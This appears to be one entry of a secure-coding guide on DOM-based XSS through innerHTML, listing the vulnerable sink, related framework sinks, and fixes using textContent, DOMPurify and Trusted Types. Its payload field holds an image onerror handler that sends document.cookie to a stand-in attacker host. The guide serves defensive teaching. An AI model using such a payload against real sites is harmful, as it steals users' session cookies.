---
order: 1
cwe: 79
title: DOM XSS through innerHTML
category: injection
severity: critical
sink: |-
    element.innerHTML = userInput
payload: |-
    <img src=x onerror="fetch('//evil.sh?c='+document.cookie)">
fix: |
    element.textContent = userInput;
    // markup you must render → DOMPurify.sanitize(html)
    // and enforce it: require-trusted-types-for 'script'
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
    - https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
---

`<script>` inserted via `innerHTML` never runs — event handlers on other elements do. The same sink hides behind `v-html`, `dangerouslySetInnerHTML`, `insertAdjacentHTML`, `outerHTML` and `document.write`. Anything reaching them from a URL, `postMessage`, storage or an API is attacker-controlled.
